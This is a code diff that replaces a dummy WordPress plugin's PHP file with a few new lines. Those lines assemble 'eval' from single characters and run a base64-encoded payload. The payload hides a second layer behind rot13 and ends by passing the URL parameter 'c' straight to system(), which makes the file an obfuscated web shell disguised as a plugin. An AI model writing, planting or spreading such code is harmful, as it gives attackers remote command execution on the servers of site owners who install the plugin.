@@ -1,28 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/*
-Plugin Name: Custom Dummy Plugin
-Plugin URI: https://wordpress.org/
-Description: For testing purposes only.
-Version: 1.0.0
-Text Domain: custom-internationalized-plugin
-*/
-
-function custom_i18n_load_textdomain() {
-	load_plugin_textdomain( 'custom-internationalized-plugin', false, dirname( plugin_basename( __FILE__ ) ) . '/languages' );
-}
-
-add_action( 'init', 'custom_i18n_load_textdomain' );
-
-function custom_i18n_plugin_test() {
-	return __( 'This is a dummy plugin', 'custom-internationalized-plugin' );
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKgpDeWh0dmEgQW56cjogUGhmZ2J6IFFoenpsIEN5aHR2YQpDeWh0dmEgSEVWOiB1Z2djZjovL2piZXFjZXJmZi5iZXQvClFyZnBldmNndmJhOiBTYmUgZ3JmZ3ZhdCBjaGVjYmZyZiBiYXlsLgpJcmVmdmJhOiAxLjAuMApHcmtnIFFiem52YTogcGhmZ2J6LXZhZ3JlYW5ndmJhbnl2bXJxLWN5aHR2YQoqLwoKc2hhcGd2YmEgcGhmZ2J6X3YxOGFfeWJucV9ncmtncWJ6bnZhKCkgewoJeWJucV9jeWh0dmFfZ3JrZ3Fiem52YSggJ3BoZmdiei12YWdyZWFuZ3ZiYW55dm1ycS1jeWh0dmEnLCBzbnlmciwgcXZlYW56ciggY3lodHZhX29uZnJhbnpyKCBfX1NWWVJfXyApICkgLiAnL3luYXRobnRyZicgKTsKfQoKbnFxX25wZ3ZiYSggJ3ZhdmcnLCAncGhmZ2J6X3YxOGFfeWJucV9ncmtncWJ6bnZhJyApOwoKc2hhcGd2YmEgcGhmZ2J6X3YxOGFfY3lodHZhX2dyZmcoKSB7CgllcmdoZWEgX18oICdHdXZmIHZmIG4gcWh6emwgY3lodHZhJywgJ3BoZmdiei12YWdyZWFuZ3ZiYW55dm1ycS1jeWh0dmEnICk7Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
